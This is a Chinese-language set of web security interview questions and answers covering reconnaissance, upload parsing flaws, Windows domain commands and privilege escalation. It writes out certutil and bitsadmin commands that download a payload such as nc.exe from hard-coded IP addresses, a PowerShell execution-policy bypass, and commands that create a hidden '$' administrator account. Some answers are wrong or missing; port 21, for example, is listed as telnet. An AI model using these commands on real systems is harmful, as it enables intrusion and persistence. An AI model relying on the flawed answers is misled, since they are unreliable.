## web安全面试题

**1）给你一个目标站，你觉得应该先做什么？**

信息收集（域名子域、真实ip、端口服务探测）

漏洞发现（漏洞扫描、CMS识别、应用版本识别、poc验证漏洞存在、黑盒测试、源码审计）

漏洞利用（历史漏洞、EXP利用、能否反弹shell、爆库）

持续控制（提升权限、维持访问、清除痕迹）

**2）写出下列端口对应的服务？**

| 21     | 22   | 80   | 443   | 1433      | 3306  | 3389      |
| ------ | ---- | ---- | ----- | --------- | ----- | --------- |
| telnet | ssh  | http | https | sqlserver | mysql | **mstsc** |

**3）常见的上传解析漏洞**

**apache：**从右向左（abc.php.xxx.aaa.bbb） -> abc.php

**iis6.0:** 

文件夹名泛解析（aaa.asp文件夹下的a.txt会以asp解析）

特殊文件名(;.jpg): aaa.asp;.jpg这个文件会以asp方式运行。

**iis7.0、7.5:**

任意文件名.jpg，在后面追加上/任意文件名.php，那么这个文件会以PHP方式来运行 比如http://xxxxv/tila.jpg/ccc.php 会以tila.php解析。

**Nginx 解析漏洞：**

任意文件名后面添加xxx.php的方式来运行这个文件

在文件后面添加%00.php也会以php的方式运行。

**3）域内常用命令**

**ipconfig /all**判断是否存在域，**nslookup**判断域控是否与dns服务器在同一服务器上，**net config workstation**查看登录域信息，**net time /domain**查看主域,若是报错或者显示时间，有域控。否则不存在域。

**4）域管账号密码对其他成员执行命令**

**5）cmd下远程文件下载**

vb下载：先echo写入vb脚本，然后cscript执行下载脚本

certutil一句话下载payload：

```shell
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt
```

ftp一句话下载payload：先echo写入ftp下载脚本，然后执行ftp -s:xxx

bitsadmin 下载一句话/payload：bitsadmin /transfer down /download /priority normal 'http://198.13.37.239/nc.exe' d:\\nc.exe

js一句话读取/写入文件

powershell一句话下载payload：powershell.exe -ExecutionPolicy Bypass -File down.ps1

**6）抓包改包**

burp、fiddle、charles

**7）常见的web容器**

IIS,APACHE,NGINX,TOMCAT,WEBLOGIC,DJANGO,JBOSS

**8) 快速判断目标服务器是Windows还是linux**

是否大小写敏感

**9）常见的Windows提权方法**

1）syteminfo查看补丁信息，查找exp（内核提权）

2）mssql提取、udf提权

3）Windows系统配置错误提权(dll劫持、**注册表键AlwaysInstallElevated**、**可信任服务路径漏洞**、自动安装配置文件*、计划任务)

4) bypass uac

**10）下列端口对应的服务**

| 873           | 5000 | 5900    | 1521   |
| ------------- | ---- | ------- | ------ |
| rsync文件同步 |      | vnc远程 | oracle |

**11) .htaccess 文件配置jsp文件解析为php**

```.htacss
SetHandler application/x-httpd-php
```

**12) csrf ,ssrf .以及重放攻击的区别**

重放攻击：以登录业务为例（不具备身份，但是有认证信息）

csrf：以添加用户为例（已经有了一个身份、用户或者是管理员）

ssrf： 伪造服务端发送请求，探测内网

**13）windows下添加本地账户以及加入到管理员组的命令**

```cmd
net user whoami$ Liu78963 /add
net localgroup administrators whoami$ /add
```

**14) windows下>与>>的区别：**写入（会覆盖）与追加

**15）常见的javaweb应用以及框架**

**Hibernate、Struts2、MyBatis、Spring、spring MVC** 

**16）mysql 导出文件的命令**

```sql
mysqldump 数据库名 --host=主机 --port=端口 -u用户名 -p密码 --where="过滤条件" --tables 数据表 > 导出文件路径.sql
```

**17）缓冲区溢出**

**18）DNS域传送**漏洞复现命令

**19）nmap 默认扫描哪些端口**

默认情况下，Nmap用指定的协议对端口1到1024以及`nmap-services` 文件中列出的更高的端口在扫描。